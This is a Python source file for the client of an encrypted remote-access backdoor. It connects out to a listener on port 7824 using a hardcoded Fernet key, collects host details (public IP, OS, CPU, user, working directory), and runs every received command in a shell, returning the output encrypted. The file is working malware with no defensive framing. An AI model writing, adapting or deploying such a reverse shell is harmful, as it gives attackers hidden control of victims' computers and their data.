from requests import get
import platform
from datetime import datetime
import socket 
import subprocess 
import os
from cryptography.fernet import Fernet
import base64
import time

def client_inf():
	now = datetime.now()
	pub_ip = get('https://api.ipify.org').text
	arch_inf = platform.machine()
	os_inf = platform.platform()
	cpu_inf = platform.processor()
	usr_inf = os.uname()
	cwd_inf = os.getcwd()
	client_info = (f'\n{now}\nPUBLIC_IP:{pub_ip}\nARCH: {arch_inf}\nOS: {os_inf}\nCPU:  {cpu_inf}\nUSER: {usr_inf}\nCWD: {cwd_inf}')
	return client_info

k1 = '5fpjL0m17ZbA-f7mHihDYhtjrJ31oUaivx104iWp2is='
key = k1.encode('utf-8')

port = 7824
host = '0.0.0.0'
fnet = Fernet(key)

def crypt(msg,arg1):
	if arg1 == "e":
		m2 = base64.b64encode(msg)
		m3 = fnet.encrypt(m2)
		return m3
	else:
		m1 = fnet.decrypt(msg)
		m2 = base64.b64decode(m1)
		m3 = m2.decode()
		return m3

s = socket.socket()
while True:
	try:
		s.connect((host,port))
		break
	except:
		time.sleep(1)

while True:
	get_resp = s.recv(40960)
	cmd = crypt(get_resp,"d")

	if cmd == "quit":
		break
	elif cmd == "getcwd":
		s.send(crypt(os.getcwd().encode("utf-8"),"e"))
	elif cmd == "getinfo":
		s.send(crypt(client_inf().encode('utf-8'),"e"))
	elif cmd.split()[0] == "cd":
		if len(cmd) == 2:
			s.send(crypt("\n\n\033[31mYOU MUST STATE A PATH TO CHANGE DIRECTORY TO\033[0m\n\n".encode('utf-8'),'e'))
		elif len(cmd) == 3:
			s.send(crypt("\n\n\033[31mYOU MUST STATE A PATH TO CHANGE DIRECTORY TO\033[0m\n\n".encode('utf-8'),'e'))
		else:
			os.chdir(cmd.split()[1])
			s.send(crypt("OK".encode('utf-8'),'e'))
	else:
		p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
		s.send(crypt(p.stdout.read(),"e"))
		retval = p.wait()

s.close()
